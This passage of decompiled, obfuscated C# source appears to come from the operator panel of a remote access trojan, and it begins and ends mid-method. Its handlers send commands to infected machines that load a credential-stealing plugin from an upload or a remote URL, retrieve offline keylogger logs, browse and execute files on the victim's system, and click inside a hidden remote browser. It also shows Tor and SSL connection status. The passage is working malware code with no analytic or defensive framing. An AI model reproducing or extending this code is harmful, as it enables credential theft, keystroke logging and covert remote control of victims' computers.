            Class136.Class138 class2;
            string str2 = Class136.smethod_29(ref Application.StartupPath + @"\data\plugins\pws.plg");
            if (Class135.smethod_0().PluginsUpload)
            {
                class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = "crd_logins_req|" + str2;
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
            else
            {
                if (((((Class135.smethod_0().PluginsURLPws.Length < 8) | !Class135.smethod_0().PluginsURLPws.Contains("://")) | !Class135.smethod_0().PluginsURLPws.Contains("http")) | !Class135.smethod_0().PluginsURLPws.Contains(".")) | (Operators.CompareString(Class135.smethod_0().PluginsURLPws, "URL to plugin: http://site.com/pws.plg", true) == 0))
                {
                    Interaction.MsgBox("URL to Credentials plugin is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
                    Class130.fSettings_0.Visible = true;
                    bool flag = false;
                    Form form = this;
                    Form form2 = Class130.fSettings_0;
                    Rectangle rectangle = (form == null) ? Screen.FromPoint(form2.Location).WorkingArea : form.RectangleToScreen(form.ClientRectangle);
                    form2.Location = new Point(rectangle.Left + ((rectangle.Width - form2.Width) / 2), rectangle.Top + ((rectangle.Height - form2.Height) / 2));
                    if (flag)
                    {
                        form2.Visible = true;
                    }
                    Class130.fSettings_0.Activate();
                    Class130.fSettings_0.vmethod_6().SelectedIndex = 3;
                    Class130.fSettings_0.vmethod_44().Select();
                    Class130.fSettings_0.vmethod_44().BackColor = Color.Red;
                    return;
                }
                class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = "crd_logins|" + str2 + "|" + Class135.smethod_0().PluginsURLPws;
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
            this.vmethod_418().Enabled = false;
        }
    }

    private void method_138(object sender, KeyEventArgs e)
    {
        if (e.KeyData == (Keys.Control | Keys.A))
        {
            IEnumerator enumerator = this.vmethod_76().Items.GetEnumerator();
            while (enumerator.MoveNext())
            {
                ((ListViewItem) enumerator.Current).Selected = true;
            }
        }
    }

    private void method_139(object sender, EventArgs e)
    {
        if (this.vmethod_418().Items.Count != 0)
        {
            Clipboard.Clear();
            string left = null;
            GClass7 class2 = this.vmethod_418();
            int num3 = class2.Items.Count - 1;
            int num = 0;
            while (true)
            {
                if (num > num3)
                {
                    class2 = null;
                    if (Operators.CompareString(left, null, true) != 0)
                    {
                        Clipboard.Clear();
                        string text1 = left.ToString();
                        Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
                    }
                    break;
                }
                left = left + class2.Items[num].Text;
                int num4 = class2.Columns.Count - 1;
                int num2 = 1;
                while (true)
                {
                    if (num2 > num4)
                    {
                        left = left + "\r\n";
                        num++;
                        break;
                    }
                    left = left + "\t" + class2.Items[num].SubItems[num2].Text;
                    num2++;
                }
            }
        }
    }

    public void method_14(ref string string_12, string string_13)
    {
        if (this.vmethod_578().InvokeRequired)
        {
            object[] args = new object[] { string_12, string_13 };
            this.vmethod_578().Invoke(new Delegate7(this.method_14), args);
        }
        else
        {
            IEnumerator enumerator = this.vmethod_578().Items.GetEnumerator();
            while (true)
            {
                if (enumerator.MoveNext())
                {
                    Color red;
                    ListViewItem current = (ListViewItem) enumerator.Current;
                    if (Operators.CompareString(current.Text, string_12, true) != 0)
                    {
                        continue;
                    }
                    if (Operators.CompareString(string_13, "1", true) == 0)
                    {
                        red = Color.Red;
                        string_13 = "Stopped";
                    }
                    else if (Operators.CompareString(string_13, "2", true) == 0)
                    {
                        red = Color.DeepSkyBlue;
                        string_13 = "Paused";
                    }
                    else if (Operators.CompareString(string_13, "3", true) == 0)
                    {
                        red = Color.LimeGreen;
                        string_13 = "Started";
                    }
                    else if (Operators.CompareString(string_13, "4", true) == 0)
                    {
                        red = Color.Red;
                        string_13 = "Uninstalled";
                    }
                    if (current.Focused)
                    {
                        this.vmethod_578().SelectedItems.Clear();
                    }
                    if (string_13.Length > 0)
                    {
                        current.SubItems[3].Text = string_13;
                    }
                    current.BackColor = red;
                }
                return;
            }
        }
    }

    private void method_140(object sender, EventArgs e)
    {
        if (this.vmethod_418().Items.Count != 0)
        {
            Clipboard.Clear();
            string left = null;
            GClass7 class2 = this.vmethod_418();
            int num3 = class2.Items.Count - 1;
            int num = 0;
            while (true)
            {
                if (num > num3)
                {
                    class2 = null;
                    if (Operators.CompareString(left, null, true) != 0)
                    {
                        Clipboard.Clear();
                        string text1 = left.ToString();
                        Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
                    }
                    break;
                }
                if (class2.Items[num].Selected)
                {
                    left = left + class2.Items[num].Text;
                    int num4 = class2.Columns.Count - 1;
                    int num2 = 1;
                    while (true)
                    {
                        if (num2 > num4)
                        {
                            left = left + "\r\n";
                            break;
                        }
                        left = left + "\t" + class2.Items[num].SubItems[num2].Text;
                        num2++;
                    }
                }
                num++;
            }
        }
    }

    private void method_141(object sender, EventArgs e)
    {
        if (this.vmethod_78().Items.Count != 0)
        {
            Clipboard.Clear();
            string left = null;
            GClass7 class2 = this.vmethod_78();
            int num3 = class2.Items.Count - 1;
            int num = 0;
            while (true)
            {
                if (num > num3)
                {
                    class2 = null;
                    if (Operators.CompareString(left, null, true) != 0)
                    {
                        Clipboard.Clear();
                        string text1 = left.ToString();
                        Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
                    }
                    break;
                }
                if (class2.Items[num].Selected)
                {
                    left = left + class2.Items[num].Text;
                    int num4 = class2.Columns.Count - 1;
                    int num2 = 1;
                    while (true)
                    {
                        if (num2 > num4)
                        {
                            left = left + "\r\n";
                            break;
                        }
                        left = left + "\t" + class2.Items[num].SubItems[num2].Text;
                        num2++;
                    }
                }
                num++;
            }
        }
    }

    private void method_142(object sender, EventArgs e)
    {
        if (this.vmethod_78().Items.Count != 0)
        {
            Clipboard.Clear();
            string left = null;
            GClass7 class2 = this.vmethod_78();
            int num3 = class2.Items.Count - 1;
            int num = 0;
            while (true)
            {
                if (num > num3)
                {
                    class2 = null;
                    if (Operators.CompareString(left, null, true) != 0)
                    {
                        Clipboard.Clear();
                        string text1 = left.ToString();
                        Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
                    }
                    break;
                }
                left = left + class2.Items[num].Text;
                int num4 = class2.Columns.Count - 1;
                int num2 = 1;
                while (true)
                {
                    if (num2 > num4)
                    {
                        left = left + "\r\n";
                        num++;
                        break;
                    }
                    left = left + "\t" + class2.Items[num].SubItems[num2].Text;
                    num2++;
                }
            }
        }
    }

    private void method_143(object sender, MouseEventArgs e)
    {
        this.vmethod_390().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_388().SelectedItems.Count > 0, true, false));
    }

    private void method_144(object sender, EventArgs e)
    {
        if (this.collection_1.Count > 0)
        {
            this.vmethod_446().Enabled = false;
            this.vmethod_448().Enabled = false;
            this.vmethod_450().Enabled = false;
            this.vmethod_696().Enabled = false;
            this.vmethod_452().Enabled = false;
            this.vmethod_454().Enabled = false;
            this.vmethod_76().Enabled = false;
            this.vmethod_720().Items.Clear();
            this.string_8 = Conversions.ToString(this.collection_1[this.collection_1.Count]);
            this.collection_1.Remove(this.collection_1.Count);
            this.vmethod_474().BringToFront();
            this.vmethod_474().Visible = true;
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = Conversions.ToString(Operators.ConcatenateObject("files_get|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_8)) + "|", Interaction.IIf(this.vmethod_812().Checked, "1", "0")));
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    private void method_145(object sender, EventArgs e)
    {
        if (this.string_8.Length >= 3)
        {
            this.vmethod_446().Enabled = false;
            this.vmethod_448().Enabled = false;
            this.vmethod_450().Enabled = false;
            this.vmethod_696().Enabled = false;
            this.vmethod_452().Enabled = false;
            this.vmethod_454().Enabled = false;
            this.vmethod_76().Enabled = false;
            this.vmethod_720().Items.Clear();
            this.vmethod_720().BackColor = Color.White;
            this.vmethod_474().BringToFront();
            this.vmethod_474().Visible = true;
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = Conversions.ToString(Operators.ConcatenateObject("files_get|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(Directory.GetDirectoryRoot(this.string_8))) + "|", Interaction.IIf(this.vmethod_812().Checked, "1", "0")));
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    private void method_146(object sender, EventArgs e)
    {
        if (this.string_8.Length >= 3)
        {
            this.vmethod_446().Enabled = false;
            this.vmethod_448().Enabled = false;
            this.vmethod_450().Enabled = false;
            this.vmethod_696().Enabled = false;
            this.vmethod_452().Enabled = false;
            this.vmethod_454().Enabled = false;
            this.vmethod_76().Enabled = false;
            this.vmethod_720().Items.Clear();
            this.vmethod_474().BringToFront();
            this.vmethod_474().Visible = true;
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = Conversions.ToString(Operators.ConcatenateObject("files_get|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_8)) + "|", Interaction.IIf(this.vmethod_812().Checked, "1", "0")));
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    public void method_147()
    {
        if (base.InvokeRequired)
        {
            base.Invoke(new Delegate29(this.method_147), new object[0]);
        }
        else
        {
            base.Visible = true;
            this.vmethod_560().RunWorkerAsync();
        }
    }

    public void method_148()
    {
        if (base.InvokeRequired)
        {
            base.Invoke(new Delegate33(this.method_148), new object[0]);
        }
        else
        {
            this.int_0 = 0;
            base.Opacity = this.int_0;
            base.Visible = false;
        }
    }

    private void method_149(object sender, EventArgs e)
    {
        if (this.string_8.Length > 3)
        {
            this.collection_1.Add(this.string_8, null, null, null);
            this.vmethod_446().Enabled = false;
            this.string_8 = Class136.smethod_21(ref this.string_8);
            this.vmethod_446().Enabled = false;
            this.vmethod_448().Enabled = false;
            this.vmethod_450().Enabled = false;
            this.vmethod_696().Enabled = false;
            this.vmethod_452().Enabled = false;
            this.vmethod_454().Enabled = false;
            this.vmethod_76().Enabled = false;
            this.vmethod_720().Items.Clear();
            this.vmethod_474().BringToFront();
            this.vmethod_474().Visible = true;
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = Conversions.ToString(Operators.ConcatenateObject("files_get|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_8)) + "|", Interaction.IIf(this.vmethod_812().Checked, "1", "0")));
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    public void method_15(ref string string_12, string string_13)
    {
        if (this.vmethod_624().InvokeRequired)
        {
            object[] args = new object[] { string_12, string_13 };
            this.vmethod_624().Invoke(new Delegate39(this.method_15), args);
        }
        else
        {
            IEnumerator enumerator = this.vmethod_624().Items.GetEnumerator();
            while (true)
            {
                if (enumerator.MoveNext())
                {
                    Color red;
                    ListViewItem current = (ListViewItem) enumerator.Current;
                    if (Operators.CompareString(current.SubItems[2].Text, string_12, true) != 0)
                    {
                        continue;
                    }
                    if (Operators.CompareString(string_13, "0", true) == 0)
                    {
                        red = Color.Red;
                    }
                    else if (Operators.CompareString(string_13, "1", true) == 0)
                    {
                        red = Color.LimeGreen;
                    }
                    if (current.Focused)
                    {
                        this.vmethod_624().SelectedItems.Clear();
                    }
                    current.BackColor = red;
                }
                return;
            }
        }
    }

    private void method_150(object sender, EventArgs e)
    {
        if (this.vmethod_454().Items.Count > 0)
        {
            this.collection_1.Clear();
            this.vmethod_696().Enabled = false;
            this.vmethod_76().Enabled = false;
            this.vmethod_720().Items.Clear();
            Class127 selectedItem = (Class127) this.vmethod_454().SelectedItem;
            this.vmethod_474().BringToFront();
            this.vmethod_474().Visible = true;
            Class136.Class138 class3 = new Class136.Class138();
            class3.string_0 = this.string_4;
            class3.string_1 = Conversions.ToString(Operators.ConcatenateObject("files_get|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(Strings.Split(selectedItem.method_0(), " ", 4, CompareMethod.Text)[2])) + "|", Interaction.IIf(this.vmethod_812().Checked, "1", "0")));
            class3.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
            {
                new Thread(new ThreadStart(class3._Lambda$__0)).Start();
            }
        }
    }

    private void method_151(object sender, KeyEventArgs e)
    {
        if (e.KeyData == (Keys.Control | Keys.A))
        {
            IEnumerator enumerator = this.vmethod_388().Items.GetEnumerator();
            while (enumerator.MoveNext())
            {
                ((ListViewItem) enumerator.Current).Selected = true;
            }
        }
    }

    private void method_152(object sender, EventArgs e)
    {
        if (this.vmethod_388().SelectedItems.Count > 0)
        {
            ListViewItem item;
            object[] objArray;
            bool[] flagArray;
            this.vmethod_556().BringToFront();
            this.vmethod_556().Visible = true;
            this.vmethod_280().Clear();
            this.vmethod_280().Enabled = false;
            this.vmethod_388().Enabled = false;
            this.vmethod_712().Enabled = false;
            this.vmethod_702().Enabled = false;
            this.vmethod_704().Enabled = false;
            object[] objArray1 = new object[] { (item = this.vmethod_388().SelectedItems[0]).Tag };
            bool[] flagArray1 = new bool[] { true };
            if (flagArray[0])
            {
                item.Tag = objArray[0];
            }
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = "klgoff_get|" + Convert.ToBase64String((byte[]) NewLateBinding.LateGet(Encoding.UTF8, null, "GetBytes", objArray = objArray1, null, null, flagArray = flagArray1));
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    private void method_153(object sender, EventArgs e)
    {
        if (!Class130.concurrentDictionary_3.ContainsKey(this.string_4))
        {
            Interaction.MsgBox("No information available. Reason: You are not connected to the client!", MsgBoxStyle.Critical, Application.ProductName);
        }
        else if (!Class130.concurrentDictionary_3[this.string_4].IS_SSL)
        {
            Interaction.MsgBox("This connection is rerouted via the Tor network.", MsgBoxStyle.Information, Application.ProductName);
        }
        else
        {
            string[] textArray1 = new string[10];
            textArray1[0] = "This connection is encrypted using the following parameters: \r\nCipher: ";
            textArray1[1] = Class130.concurrentDictionary_3[this.string_4].SSL_CIPHER;
            textArray1[2] = "\r\nHash: ";
            textArray1[3] = Class130.concurrentDictionary_3[this.string_4].SSL_HASH;
            textArray1[4] = "\r\nKey exchange: ";
            textArray1[5] = Class130.concurrentDictionary_3[this.string_4].SSL_KEYEXCHANGE;
            textArray1[6] = "\r\nProtocol: ";
            textArray1[7] = Class130.concurrentDictionary_3[this.string_4].SSL_PROTOCOL;
            textArray1[8] = "\r\nCipher suite: ";
            textArray1[9] = Class130.concurrentDictionary_3[this.string_4].SSL_CIPHERSUITE;
            Interaction.MsgBox(string.Concat(textArray1), MsgBoxStyle.Information, Application.ProductName);
        }
    }

    private void method_154(object sender, EventArgs e)
    {
        this.vmethod_18().SelectedIndex = 11;
        this.method_41();
    }

    private void method_155(object sender, KeyEventArgs e)
    {
        if (e.KeyData == (Keys.Control | Keys.A))
        {
            IEnumerator enumerator = this.vmethod_418().Items.GetEnumerator();
            while (enumerator.MoveNext())
            {
                ((ListViewItem) enumerator.Current).Selected = true;
            }
        }
    }

    private void method_156(object sender, EventArgs e)
    {
        this.vmethod_444().Text = "Selected: " + Conversions.ToString(this.vmethod_720().SelectedItems.Count);
        if ((this.fThumb_0 != null) && this.fThumb_0.Visible)
        {
            GClass7 class2 = this.vmethod_720();
            if ((class2.SelectedItems.Count > 0) && Class136.smethod_5(class2.SelectedItems[0].Text))
            {
                this.fThumb_0.method_0(class2.SelectedItems[0].Text, this.string_0, this.string_1, this.string_2, this.string_3);
                Class136.Class138 class3 = new Class136.Class138();
                class3.string_0 = this.string_4;
                class3.string_1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("thumb_data|", class2.SelectedItems[0].Tag), "|"), Class130.fSettings_0.vmethod_92().Text), "|"), Class130.fSettings_0.vmethod_86().Text));
                class3.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                {
                    new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                }
                this.fThumb_0.method_1();
            }
            class2 = null;
        }
    }

    private void method_157(object sender, DrawItemEventArgs e)
    {
        if (e.Index > -1)
        {
            Class127 class2 = (Class127) this.vmethod_454().Items[e.Index];
            e.DrawBackground();
            e.Graphics.DrawImage(class2.method_2(), e.Bounds.Left + 5, e.Bounds.Top);
            e.Graphics.DrawString(class2.method_0(), new Font(this.Font, FontStyle.Regular), Brushes.Black, (float) (class2.method_2().Width + 10), (float) e.Bounds.Top, StringFormat.GenericDefault);
        }
    }

    private void method_158(object sender, MeasureItemEventArgs e)
    {
        e.ItemHeight = this.imageList_1.ImageSize.Height;
        e.ItemWidth = this.imageList_1.ImageSize.Width;
    }

    private void method_159(object sender, MouseEventArgs e)
    {
        if (Operators.CompareString(this.vmethod_708().Text, "Stop", true) == 0)
        {
            Class136.Class138 class2;
            if (e.Button == MouseButtons.Left)
            {
                string[] textArray1 = new string[10];
                textArray1[0] = "remotebrowser_click|";
                textArray1[1] = Conversions.ToString(0x201);
                textArray1[2] = ",";
                textArray1[3] = Conversions.ToString(this.vmethod_464().Bounds.Width);
                textArray1[4] = ",";
                textArray1[5] = Conversions.ToString(this.vmethod_464().Bounds.Height);
                textArray1[6] = ",";
                textArray1[7] = Conversions.ToString(e.X);
                textArray1[8] = ",";
                textArray1[9] = Conversions.ToString(e.Y);
                class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = string.Concat(textArray1);
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
            if (e.Button == MouseButtons.Right)
            {
                string[] textArray2 = new string[10];
                textArray2[0] = "remotebrowser_click|";
                textArray2[1] = Conversions.ToString(0x204);
                textArray2[2] = ",";
                textArray2[3] = Conversions.ToString(this.vmethod_464().Bounds.Width);
                textArray2[4] = ",";
                textArray2[5] = Conversions.ToString(this.vmethod_464().Bounds.Height);
                textArray2[6] = ",";
                textArray2[7] = Conversions.ToString(e.X);
                textArray2[8] = ",";
                textArray2[9] = Conversions.ToString(e.Y);
                class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = string.Concat(textArray2);
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
            if (e.Button == MouseButtons.Middle)
            {
                string[] textArray3 = new string[10];
                textArray3[0] = "remotebrowser_click|";
                textArray3[1] = Conversions.ToString(0x207);
                textArray3[2] = ",";
                textArray3[3] = Conversions.ToString(this.vmethod_464().Bounds.Width);
                textArray3[4] = ",";
                textArray3[5] = Conversions.ToString(this.vmethod_464().Bounds.Height);
                textArray3[6] = ",";
                textArray3[7] = Conversions.ToString(e.X);
                textArray3[8] = ",";
                textArray3[9] = Conversions.ToString(e.Y);
                class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = string.Concat(textArray3);
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
        }
    }

    public void method_16(ref string string_12)
    {
        string str3 = string.Empty;
        string text = string.Empty;
        string key = string.Empty;
        string str5 = string.Empty;
        string str6 = string.Empty;
        string str7 = string.Empty;
        string s = string.Empty;
        ImageList list1 = new ImageList();
        list1.ImageSize = new Size(0x10, 0x10);
        ImageList list2 = list1;
        if (this.vmethod_78().InvokeRequired)
        {
            object[] args = new object[] { string_12 };
            this.vmethod_78().Invoke(new Delegate34(this.method_16), args);
        }
        else
        {
            List<ListViewItem> list3 = new List<ListViewItem>();
            this.vmethod_78().Items.Clear();
            this.vmethod_78().SmallImageList = list2;
            this.vmethod_134().Value = 0;
            this.vmethod_134().Maximum = 1;
            this.vmethod_120().set_MaximumValue(1);
            this.vmethod_120().Visible = true;
            List<JToken> list = Enumerable.ToList<JToken>(JObject.Parse(string_12.Substring(7, string_12.Length - 8))["block"]);
            this.vmethod_120().set_MaximumValue(list.Count - 1);
            this.vmethod_120().set_Value(0);
            this.vmethod_134().Maximum = this.vmethod_120().get_MaximumValue();
            string str8 = list[list.Count - 1]["cpuusage"].ToString();
            string str9 = list[list.Count - 1]["ramsize"].ToString();
            string str10 = list[list.Count - 1]["ramfree"].ToString();
            string str11 = list[list.Count - 1]["ramload"].ToString();
            this.vmethod_124().Text = "Processes: " + Conversions.ToString((int) (list.Count - 1));
            this.vmethod_126().Text = "CPU Usage: " + str8;
            this.vmethod_128().Text = "RAM Size: " + str9;
            this.vmethod_130().Text = "RAM Available: " + str10;
            this.vmethod_132().Text = "RAM Load: " + str11;
            this.vmethod_508().SendToBack();
            this.vmethod_508().Visible = false;
            List<JToken>.Enumerator enumerator = list.GetEnumerator();
            while (enumerator.MoveNext())
            {
                JToken current = enumerator.Current;
                ListViewItem item = new ListViewItem();
                str3 = current["name"].ToString();
                text = current["path"].ToString();
                key = current["pid"].ToString();
                str5 = current["threads"].ToString();
                str6 = current["mem"].ToString();
                current["isprc"].ToString();
                str7 = current["pri"].ToString();
                byte[] buffer = Convert.FromBase64String(current["icon"].ToString());
                Image image = Class136.smethod_18(ref buffer);
                list2.Images.Add(key, image);
                s = current["desc"].ToString();
                s = Encoding.UTF8.GetString(Convert.FromBase64String(s));
                item.Text = str3;
                item.ImageKey = key;
                item.SubItems.Add(s);
                item.SubItems.Add(text);
                item.SubItems.Add(key);
                item.SubItems.Add(str5);
                item.SubItems.Add(str6);
                item.SubItems.Add(Class136.smethod_19(Conversions.ToInteger(str7)));
                item.Tag = key;
                if (Operators.CompareString(key, Class130.concurrentDictionary_3[this.string_4].sPID, true) == 0)
                {
                    item.BackColor = Color.DeepSkyBlue;
                }
                list3.Add(item);
                if (this.vmethod_120().get_Value() < this.vmethod_120().get_MaximumValue())
                {
                    ZeroitAnidasoCircleProgress progress;
                    ToolStripProgressBar bar;
                    (progress = this.vmethod_120()).set_Value(progress.get_Value() + 1);
                    (bar = this.vmethod_134()).Value = bar.Value + 1;
                }
                Application.DoEvents();
            }
            this.vmethod_120().set_Value(this.vmethod_120().get_MaximumValue());
            this.vmethod_120().Visible = false;
            this.vmethod_78().Enabled = true;
            this.vmethod_78().Items.AddRange(list3.ToArray());
            this.vmethod_134().Value = 0;
        }
    }

    private void method_160(object sender, MouseEventArgs e)
    {
        Operators.CompareString(this.vmethod_708().Text, "Stop", true);
    }

    private void method_161(object sender, EventArgs e)
    {
        Form fSrch;
        Form form2;
        bool flag;
        Rectangle rectangle;
        if (Class130.concurrentDictionary_3[this.string_4].fSrch == null)
        {
            Class130.concurrentDictionary_3[this.string_4].fSrch = new fSearch();
            Class130.concurrentDictionary_3[this.string_4].fSrch.method_7(this.string_0, this.string_2, this.string_1, this.string_3, this.string_8, this.string_4);
            Class130.concurrentDictionary_3[this.string_4].fSrch.Opacity = 0.0;
            Class130.concurrentDictionary_3[this.string_4].fSrch.Activate();
            Class130.concurrentDictionary_3[this.string_4].fSrch.Show();
            flag = false;
            form2 = this;
            fSrch = Class130.concurrentDictionary_3[this.string_4].fSrch;
            rectangle = (form2 == null) ? Screen.FromPoint(fSrch.Location).WorkingArea : form2.RectangleToScreen(form2.ClientRectangle);
            fSrch.Location = new Point(rectangle.Left + ((rectangle.Width - fSrch.Width) / 2), rectangle.Top + ((rectangle.Height - fSrch.Height) / 2));
            if (flag)
            {
                fSrch.Visible = true;
            }
        }
        else
        {
            if (!Class130.concurrentDictionary_3[this.string_4].fSrch.Visible)
            {
                flag = false;
                form2 = this;
                fSrch = Class130.concurrentDictionary_3[this.string_4].fSrch;
                rectangle = (form2 == null) ? Screen.FromPoint(fSrch.Location).WorkingArea : form2.RectangleToScreen(form2.ClientRectangle);
                fSrch.Location = new Point(rectangle.Left + ((rectangle.Width - fSrch.Width) / 2), rectangle.Top + ((rectangle.Height - fSrch.Height) / 2));
                if (flag)
                {
                    fSrch.Visible = true;
                }
                Class130.concurrentDictionary_3[this.string_4].fSrch.method_6();
            }
            Class130.concurrentDictionary_3[this.string_4].fSrch.method_0(this.string_8);
        }
    }

    private void method_162(object sender, EventArgs e)
    {
        string left = string.Empty;
        GClass7 class2 = this.vmethod_720();
        int num2 = class2.Items.Count - 1;
        int num = 0;
        while (true)
        {
            ConcurrentDictionary<string, CClient> dictionary;
            string str3;
            ref double numRef;
            if (num <= num2)
            {
                if (!class2.Items[num].Selected)
                {
                    num++;
                    continue;
                }
                left = Conversions.ToString(class2.Items[num].Tag);
            }
            if (Operators.CompareString(left, string.Empty, true) == 0)
            {
                Interaction.MsgBox("No file selected!", MsgBoxStyle.Exclamation, Application.ProductName);
                return;
            }
            string str2 = Interaction.InputBox("Enter command line parameters: (Leave empty for none)", Application.ProductName, string.Empty, -1, -1);
            CClient client = (dictionary = Class130.concurrentDictionary_3)[str3 = this.string_4];
            string[] textArray1 = new string[] { "files_exec|", left, "|", str2, "|1" };
            ref string s = ref string.Concat(textArray1);
            ref CClient clientRef = ref client;
            s = s + "@";
            byte[] bytes = Encoding.UTF8.GetBytes(s);
            clientRef.sock_async.method_6(bytes);
            *(numRef = ref clientRef.stats_bytes_out) = numRef + s.Length;
            *(numRef = ref Class130.struct20_0.double_3) = numRef + s.Length;
            *(numRef = ref Class130.struct20_0.double_5) = numRef + 1.0;
            dictionary[str3] = client;
            class2 = null;
            return;
        }
    }

    private void method_163(object sender, EventArgs e)
    {
        string left = string.Empty;
        GClass7 class2 = this.vmethod_720();
        int num2 = class2.Items.Count - 1;
        int num = 0;
        while (true)
        {
            ConcurrentDictionary<string, CClient> dictionary;
            string str3;
            ref double numRef;
            if (num <= num2)
            {
                if (!class2.Items[num].Selected)
                {
                    num++;
                    continue;
                }
                left = Conversions.ToString(class2.Items[num].Tag);
            }
            if (Operators.CompareString(left, string.Empty, true) == 0)
            {
                Interaction.MsgBox("No file selected!", MsgBoxStyle.Exclamation, Application.ProductName);
                return;
            }
            string str2 = Interaction.InputBox("Enter command line parameters: (Leave empty for none)", Application.ProductName, string.Empty, -1, -1);
            CClient client = (dictionary = Class130.concurrentDictionary_3)[str3 = this.string_4];
            string[] textArray1 = new string[] { "files_exec|", left, "|", str2, "|0" };
            ref string s = ref string.Concat(textArray1);
            ref CClient clientRef = ref client;
            s = s + "@";
            byte[] bytes = Encoding.UTF8.GetBytes(s);
            clientRef.sock_async.method_6(bytes);
            *(numRef = ref clientRef.stats_bytes_out) = numRef + s.Length;
            *(numRef = ref Class130.struct20_0.double_3) = numRef + s.Length;
            *(numRef = ref Class130.struct20_0.double_5) = numRef + 1.0;
            dictionary[str3] = client;
            class2 = null;
            return;
        }
    }

    private void method_164(object sender, MouseEventArgs e)
    {
        if (Operators.CompareString(this.vmethod_708().Text, "Stop", true) == 0)
        {
            Class136.Class138 class2;
            if (e.Button == MouseButtons.Left)
            {
                string[] textArray1 = new string[10];
                textArray1[0] = "remotebrowser_click|";
                textArray1[1] = Conversions.ToString(0x202);
                textArray1[2] = ",";
                textArray1[3] = Conversions.ToString(this.vmethod_464().Bounds.Width);
                textArray1[4] = ",";
                textArray1[5] = Conversions.ToString(this.vmethod_464().Bounds.Height);
                textArray1[6] = ",";
                textArray1[7] = Conversions.ToString(e.X);
                textArray1[8] = ",";
                textArray1[9] = Conversions.ToString(e.Y);
                class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = string.Concat(textArray1);
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
            if (e.Button == MouseButtons.Right)
            {
                string[] textArray2 = new string[10];
                textArray2[0] = "remotebrowser_click|";
                textArray2[1] = Conversions.ToString(0x205);
                textArray2[2] = ",";
                textArray2[3] = Conversions.ToString(this.vmethod_464().Bounds.Width);
                textArray2[4] = ",";
                textArray2[5] = Conversions.ToString(this.vmethod_464().Bounds.Height);
                textArray2[6] = ",";
                textArray2[7] = Conversions.ToString(e.X);
                textArray2[8] = ",";
                textArray2[9] = Conversions.ToString(e.Y);
                class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = string.Concat(textArray2);
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
            if (e.Button == MouseButtons.Middle)
            {
                string[] textArray3 = new string[10];
                textArray3[0] = "remotebrowser_click|";
                textArray3[1] = Conversions.ToString(520);
                textArray3[2] = ",";
                textArray3[3] = Conversions.ToString(this.vmethod_464().Bounds.Width);
                textArray3[4] = ",";
                textArray3[5] = Conversions.ToString(this.vmethod_464().Bounds.Height);
                textArray3[6] = ",";
                textArray3[7] = Conversions.ToString(e.X);
                textArray3[8] = ",";
